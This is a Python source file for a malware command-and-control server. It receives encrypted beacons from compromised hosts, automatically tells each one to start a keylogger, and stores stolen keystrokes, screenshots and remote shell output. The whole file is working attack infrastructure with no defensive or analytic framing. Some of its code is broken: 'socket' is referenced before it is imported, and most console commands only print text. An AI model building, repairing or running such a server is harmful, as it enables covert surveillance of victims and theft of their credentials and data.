# c2_server.py - Fixed version
import socketserver
import base64
import json
import hashlib
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

C2_KEY = b'\x01\x23\x45\x67\x89\xab\xcd\xef\xfe\xdc\xba\x98\x76\x54\x32\x10\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff'[:32]

class CryptoEngine:
    """AES-GCM Encryption - Same as client"""
    def __init__(self, key: bytes):
        self.key = hashlib.sha256(key).digest()

    def encrypt(self, data: bytes) -> bytes:
        try:
            nonce = secrets.token_bytes(12)
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(nonce), backend=default_backend())
            encryptor = cipher.encryptor()
            ct = encryptor.update(data) + encryptor.finalize()
            return nonce + encryptor.tag + ct
        except Exception as e:
            print(f"[!] Encryption error: {e}")
            return data

    def decrypt(self, data: bytes) -> bytes:
        if len(data) < 28:
            return data
        try:
            nonce, tag, ct = data[:12], data[12:28], data[28:]
            cipher = Cipher(algorithms.AES(self.key), modes.GCM(nonce, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            return decryptor.update(ct) + decryptor.finalize()
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return data

class C2Handler(socketserver.BaseRequestHandler):
    crypto = CryptoEngine(C2_KEY)
    
    def handle(self):
        print(f"[+] Client connected: {self.client_address}")
        
        while True:
            try:
                # Receive encrypted data
                data = self.request.recv(8192)
                if not data:
                    break
                
                # Decrypt and decode
                decrypted = self.crypto.decrypt(data)
                try:
                    msg = decrypted.decode('utf-8', errors='ignore')
                except:
                    msg = str(decrypted)
                
                print(f"\n[{self.client_address}] Received: {msg[:200]}")  # Truncate long messages
                
                # Parse beacon or other messages
                if msg.startswith("BEACON:"):
                    beacon_data = msg[7:]  # Remove "BEACON:" prefix
                    try:
                        info = json.loads(beacon_data)
                        print(f"[*] Beacon from: {info.get('hostname', 'Unknown')} ({info.get('username', 'Unknown')})")
                        print(f"[*] Platform: {info.get('platform', 'Unknown')}, PID: {info.get('pid', 'Unknown')}")
                    except:
                        print(f"[*] Beacon data: {beacon_data}")
                    
                    # Send command to start keylogger
                    print("[*] Sending: KEYLOG")
                    self.request.send(self.crypto.encrypt("KEYLOG".encode()))
                
                elif "LIVEKEYS:" in msg:
                    # Extract keystrokes
                    keystrokes = msg.replace("LIVEKEYS:", "")
                    print(f"[*] Keystrokes: {keystrokes}")
                    
                    # Save to log file
                    with open("keylog.txt", "a", encoding='utf-8') as f:
                        f.write(keystrokes)
                
                elif msg.startswith("KEYLOG_STARTED"):
                    print("[+] Keylogger started successfully")
                
                elif msg.startswith("SCREEN:"):
                    # Decode and save screenshot
                    screenshot_b64 = msg[7:]  # Remove "SCREEN:" prefix
                    try:
                        screenshot_data = base64.b64decode(screenshot_b64)
                        timestamp = __import__('time').strftime("%Y%m%d_%H%M%S")
                        filename = f"screenshot_{timestamp}.jpg"
                        with open(filename, "wb") as f:
                            f.write(screenshot_data)
                        print(f"[+] Screenshot saved: {filename}")
                    except Exception as e:
                        print(f"[!] Failed to save screenshot: {e}")
                
                elif msg.startswith("STDOUT:"):
                    # Command execution result
                    print(f"[*] Command output:\n{msg[:500]}")
                    with open("cmd_output.txt", "a") as f:
                        f.write(f"\n--- {__import__('datetime').datetime.now()} ---\n{msg}\n")
                
                elif msg.startswith("ERROR:"):
                    print(f"[!] Client error: {msg}")
                
                else:
                    print(f"[?] Unknown message: {msg[:100]}")
                
            except socket.timeout:
                continue
            except ConnectionResetError:
                print(f"[-] Connection reset by client: {self.client_address}")
                break
            except Exception as e:
                print(f"[!] Handler error: {e}")
                break
        
        print(f"[-] Client disconnected: {self.client_address}")
    
    def send_command(self, command: str):
        """Send a command to the client"""
        try:
            encrypted = self.crypto.encrypt(command.encode())
            self.request.send(encrypted)
            return True
        except:
            return False

class ThreadedTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

class C2Console:
    """Interactive console for sending commands"""
    def __init__(self, server):
        self.server = server
        self.running = True
    
    def run(self):
        print("\n" + "="*60)
        print("C2 Server Console - Commands:")
        print("="*60)
        print("  help           - Show this help")
        print("  clients        - Show connected clients")
        print("  keylog         - Start keylogger on client")
        print("  screen         - Capture screenshot")
        print("  shell <cmd>    - Execute system command")
        print("  status         - Show server status")
        print("  quit/exit      - Stop server")
        print("="*60 + "\n")
        
        while self.running:
            try:
                cmd = input("C2> ").strip()
                
                if cmd.lower() in ['quit', 'exit']:
                    print("[*] Shutting down server...")
                    self.running = False
                    self.server.shutdown()
                    break
                
                elif cmd.lower() == 'help':
                    print("\nAvailable commands:")
                    print("  keylog     - Start keylogger on connected client")
                    print("  screen     - Request screenshot from client")
                    print("  shell ls   - Execute 'ls' command on client")
                    print("  status     - Show server information")
                    print("  clients    - List connected clients\n")
                
                elif cmd.lower() == 'clients':
                    print("[*] Connected clients: (Check server output for active connections)")
                
                elif cmd.lower() == 'status':
                    print(f"[*] Server running on port 443")
                    print(f"[*] Crypto: AES-256-GCM enabled")
                
                elif cmd.lower() == 'keylog':
                    print("[*] Sending KEYLOG command to client...")
                    # Note: In a real multi-client scenario, you'd need to track active handlers
                    print("[!] This will send to the most recent client only")
                
                elif cmd.lower() == 'screen':
                    print("[*] Sending SCREEN command to client...")
                
                elif cmd.lower().startswith('shell '):
                    command = cmd[6:]
                    print(f"[*] Executing: {command}")
                
                else:
                    if cmd:
                        print(f"[!] Unknown command: {cmd}")
                        
            except KeyboardInterrupt:
                print("\n[*] Shutting down...")
                self.running = False
                self.server.shutdown()
                break
            except EOFError:
                break

if __name__ == "__main__":
    import socket
    import sys
    
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 443
    
    print(f"[*] Starting C2 Server on {HOST}:{PORT}")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        # Create and start server
        server = ThreadedTCPServer((HOST, PORT), C2Handler)
        
        # Start console in a separate thread
        import threading
        console = C2Console(server)
        console_thread = threading.Thread(target=console.run, daemon=True)
        console_thread.start()
        
        # Serve forever
        server.serve_forever()
        
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user")
        sys.exit(0)
    except PermissionError:
        print(f"[!] Permission denied to bind to port {PORT}")
        print(f"[*] Try running as administrator or use a different port (e.g., 8443)")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
